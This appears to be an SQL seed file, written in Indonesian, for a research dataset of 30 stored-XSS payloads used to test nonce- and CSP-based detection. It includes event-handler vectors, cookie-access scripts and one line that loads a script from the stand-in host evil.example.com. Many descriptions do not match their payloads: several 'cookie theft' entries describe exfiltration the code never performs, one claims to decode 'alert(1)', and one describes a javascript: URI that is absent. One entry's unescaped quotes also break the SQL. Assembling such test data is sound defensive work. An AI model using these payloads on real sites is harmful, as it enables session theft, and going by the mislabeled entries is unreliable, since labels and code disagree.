-- ============================================================
-- Lampiran A: Dataset Payload Stored XSS
-- Penelitian: Deteksi Stored Cross-Site Scripting Menggunakan Nonce Dinamis dan Analisis Pelanggaran Content Security Policy
-- ============================================================
-- Tabel: payload_dataset
-- ============================================================

CREATE TABLE IF NOT EXISTS `payload_dataset` (
  `id` int NOT NULL AUTO_INCREMENT,
  `kode_payload` varchar(20) NOT NULL,
  `payload` text NOT NULL,
  `kategori` varchar(100) NOT NULL,
  `sumber` varchar(100) NOT NULL,
  `deskripsi` text,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uq_kode_payload` (`kode_payload`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Hapus data lama sebelum insert
TRUNCATE TABLE `payload_dataset`;

-- ============================================================
-- Kategori 1: Inline Script Injection (SI-01 s.d. SI-10)
-- ============================================================
INSERT INTO `payload_dataset` (`kode_payload`, `payload`, `kategori`, `sumber`, `deskripsi`) VALUES
('SI-01',
 '<script>console.log(''XSS'')</script>',
 'Inline Script Injection',
 'OWASP Foundation',
 'Payload paling dasar: menyisipkan tag <script> langsung ke dalam konten HTML. Browser akan mengeksekusi isi script sebagai JavaScript saat merender halaman.'),

('SI-02',
 '<script>console.log(document.cookie)</script>',
 'Inline Script Injection',
 'OWASP Foundation',
 'Varian dari SI-01 yang menargetkan cookie sesi pengguna. Jika berhasil dieksekusi, payload ini akan menampilkan nilai cookie sesi yang tersimpan di browser.'),

('SI-03',
 '<script>eval(''console.log(1)'')</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Menggunakan fungsi eval() untuk mengeksekusi string sebagai kode JavaScript. Teknik ini sering digunakan untuk mengaburkan payload dari filter berbasis kata kunci sederhana.'),

('SI-04',
 '<script>eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,49,41))</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Menggabungkan eval() dengan String.fromCharCode() untuk mengobfuskasi payload. Karakter ASCII dikonversi menjadi string "alert(1)" di runtime, mempersulit deteksi berbasis teks statis.'),

('SI-05',
 '<SCRIPT>console.log(''XSS'')</SCRIPT>',
 'Inline Script Injection',
 'OWASP Foundation',
 'Varian SI-01 dengan tag script menggunakan huruf kapital. Digunakan untuk menguji apakah mekanisme deteksi bersifat case-sensitive atau case-insensitive.'),

('SI-06',
 '<script>setTimeout(function(){console.log(''XSS'')},100)</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Memanfaatkan setTimeout() untuk menunda eksekusi payload selama 100 milidetik. Teknik ini dapat digunakan untuk menghindari deteksi berbasis timing atau sandbox dengan waktu eksekusi singkat.'),

('SI-07',
 '<script>document.title='XSS'</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Mengubah judul halaman menggunakan JavaScript sebagai bukti eksekusi inline script. Digunakan untuk mengevaluasi mekanisme Rule-Based Detection dan CSP tanpa menghasilkan popup berulang.'),

('SI-08',
 '<script src=https://evil.example.com/xss.js></script>',
 'Inline Script Injection',
 'OWASP Foundation',
 'Memuat skrip eksternal dari domain penyerang menggunakan atribut src. Pada skenario nyata, file xss.js dapat berisi kode berbahaya yang kompleks, termasuk keylogger atau pengambil cookie.'),

('SI-09',
 '<script>document.write(''<img src=x onerror=console.log(''XSS'')>'')</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Payload berantai: script memanggil document.write() untuk menyisipkan tag HTML baru ke dalam DOM, yang kemudian memicu event handler onerror. Menunjukkan serangan multi-tahap menggunakan DOM manipulation.'),

('SI-10',
 '<script>fetch(''/csp-report'').then(r=>r.text()).then(d=>console.log(d))</script>',
 'Inline Script Injection',
 'PortSwigger',
 'Menggunakan Fetch API untuk melakukan HTTP request ke endpoint internal aplikasi. Pada skenario nyata, data respons dapat dikirim ke server penyerang untuk mengeksfiltrasi informasi sensitif.');

-- ============================================================
-- Kategori 2: Event Handler Injection (EH-01 s.d. EH-10)
-- ============================================================
INSERT INTO `payload_dataset` (`kode_payload`, `payload`, `kategori`, `sumber`, `deskripsi`) VALUES
('EH-01',
 '<img src=x onerror=console.log(''XSS'')>',
 'Event Handler Injection',
 'OWASP Foundation',
 'Payload klasik berbasis event handler. Tag <img> dengan src tidak valid (x) memicu event onerror secara otomatis saat browser gagal memuat gambar, lalu mengeksekusi JavaScript yang ditentukan.'),

('EH-02',
 '<body onload=console.log(''XSS'')>',
 'Event Handler Injection',
 'OWASP Foundation',
 'Menyisipkan tag <body> dengan event handler onload. Jika parser HTML mengizinkan tag body bersarang, event onload akan dipicu saat konten selesai dimuat oleh browser.'),

('EH-03',
 '<svg onload=console.log(''XSS'')>',
 'Event Handler Injection',
 'PortSwigger',
 'Memanfaatkan elemen SVG yang mendukung event handler HTML. Tag SVG yang valid secara sintaksis ini akan memicu onload segera setelah browser menyelesaikan rendering elemen SVG tersebut.'),

('EH-04',
 '<div onclick=console.log(''XSS'')>Klik saya</div>',
 'Event Handler Injection',
 'OWASP Foundation',
 'Menyisipkan event handler onclick pada elemen div. Payload ini memerlukan interaksi pengguna (klik) untuk dieksekusi, menjadikannya contoh Stored XSS yang terpicu oleh aksi pengguna.'),

('EH-05',
 '<a onmouseover=console.log(''XSS'')>Hover di sini</a>',
 'Event Handler Injection',
 'OWASP Foundation',
 'Event handler onmouseover dipicu saat kursor diarahkan ke elemen. Tidak memerlukan klik, hanya hover mouse, sehingga lebih mudah dipicu secara tidak sengaja oleh korban.'),

('EH-06',
 '<input type=text onfocus=console.log(''XSS'') autofocus>',
 'Event Handler Injection',
 'PortSwigger',
 'Atribut autofocus secara otomatis memindahkan fokus ke elemen input saat halaman dimuat, yang kemudian memicu event onfocus tanpa memerlukan interaksi pengguna sama sekali.'),

('EH-07',
 '<select onchange=console.log(''XSS'')><option>Pilih</option></select>',
 'Event Handler Injection',
 'PortSwigger',
 'Menggunakan event onchange pada elemen select. Payload dieksekusi saat pengguna mengubah pilihan pada dropdown, memanfaatkan elemen form yang umum ada di aplikasi web.'),

('EH-08',
 '<details open ontoggle=console.log(''XSS'')>Detail</details>',
 'Event Handler Injection',
 'PortSwigger',
 'Elemen HTML5 <details> dengan atribut open akan memicu event ontoggle segera saat halaman dirender. Ini adalah bypass modern untuk filter yang tidak mengenali elemen HTML5 terbaru.'),

('EH-09',
 '<video src=x onerror=console.log(''XSS'')></video>',
 'Event Handler Injection',
 'PortSwigger',
 'Mirip dengan EH-01, namun menggunakan elemen <video>. Ketika src tidak valid (x) gagal dimuat, event onerror dipicu. Menunjukkan bahwa berbagai elemen media mendukung event handler serupa.'),

('EH-10',
 '<marquee onstart=console.log(''XSS'')>Teks berjalan</marquee>',
 'Event Handler Injection',
 'OWASP Foundation',
 'Memanfaatkan elemen <marquee> (sudah deprecated) yang didukung beberapa browser lama. Event onstart dipicu saat animasi teks berjalan dimulai, segera setelah halaman dimuat.');

-- ============================================================
-- Kategori 3: Cookie Theft (CT-01 s.d. CT-05)
-- ============================================================
INSERT INTO `payload_dataset` (`kode_payload`, `payload`, `kategori`, `sumber`, `deskripsi`) VALUES
('CT-01',
 '<script>console.log(document.cookie)</script>',
 'Cookie Theft',
 'OWASP Foundation',
 'Payload simulasi pencurian sesi menggunakan Fetch API. Cookie sesi pengguna yang sedang login dikirimkan sebagai parameter URL ke endpoint attacker-listener yang disimulasikan di dalam aplikasi penelitian.'),

('CT-02',
 '<script>console.log(document.cookie)</script>',
 'Cookie Theft',
 'PortSwigger',
 'Menggunakan objek Image() untuk membuat HTTP GET request diam-diam ke endpoint penyerang. Teknik ini memanfaatkan pemuatan gambar untuk mengeksfiltrasi cookie tanpa menampilkan perubahan visual.'),

('CT-03',
 '<img src=x onerror="this.dataset.cookie=document.cookie">',
 'Cookie Theft',
 'PortSwigger',
 'Menggabungkan event handler onerror dengan pengiriman cookie. Saat gambar gagal dimuat, src diubah menjadi URL penyerang yang menyertakan nilai cookie. Merupakan kombinasi teknik EH dan CT.'),

('CT-04',
 '<script>console.log(document.cookie)</script>',
 'Cookie Theft',
 'OWASP Foundation',
 'Menggunakan XMLHttpRequest (XHR) untuk mengirim HTTP request dengan cookie sebagai parameter. Teknik ini adalah cara klasik sebelum Fetch API diperkenalkan dan masih umum ditemukan di payload XSS lama.'),

('CT-05',
 '<script>document.body.dataset.cookie=document.cookie</script>',
 'Cookie Theft',
 'PortSwigger',
 'Mengalihkan halaman (redirect) ke URL penyerang sambil membawa nilai cookie di parameter URL. Berbeda dengan teknik sebelumnya, metode ini terlihat jelas oleh korban karena halaman berpindah.');

-- ============================================================
-- Kategori 4: DOM Manipulation (DM-01 s.d. DM-05)
-- ============================================================
INSERT INTO `payload_dataset` (`kode_payload`, `payload`, `kategori`, `sumber`, `deskripsi`) VALUES
('DM-01',
 '<script>document.body.innerHTML=''<h1>Halaman diretas!</h1>''</script>',
 'DOM Manipulation',
 'OWASP Foundation',
 'Mengubah seluruh konten halaman dengan menimpa properti innerHTML dari document.body. Pada serangan nyata, penyerang dapat menampilkan form login palsu (phishing) untuk mencuri kredensial pengguna.'),

('DM-02',
 '<script>document.title=''Hacked by XSS''</script>',
 'DOM Manipulation',
 'OWASP Foundation',
 'Memodifikasi properti document.title untuk mengubah judul tab browser. Meskipun dampaknya kecil, payload ini membuktikan bahwa JavaScript dapat mengakses dan memodifikasi properti dokumen HTML.'),

('DM-03',
 '<svg><script>console.log(document.domain)</script></svg>',
 'DOM Manipulation',
 'PortSwigger',
 'Menyisipkan tag <script> di dalam elemen SVG untuk menampilkan domain aplikasi yang sedang diserang. Membuktikan bahwa konten SVG di-parse sebagai HTML dan dapat mengeksekusi JavaScript.'),

('DM-04',
 '<iframe srcdoc=''<script>console.log(1)</script>''>',
 'DOM Manipulation',
 'PortSwigger',
 'Menggunakan atribut srcdoc pada <iframe> untuk menyisipkan dokumen HTML lengkap yang berisi script berbahaya. Payload ini efektif karena konten srcdoc di-parse sebagai HTML penuh oleh browser.'),

('DM-05',
 '<iframe srcdoc=''<script>document.body.dataset.cookie=document.cookie</script>''>',
 'DOM Manipulation',
 'PortSwigger',
 'Memanfaatkan javascript: URI scheme pada atribut src iframe untuk mengeksekusi JavaScript langsung. Browser lama atau dengan pengaturan keamanan minimal akan mengeksekusi kode ini saat merender iframe.');
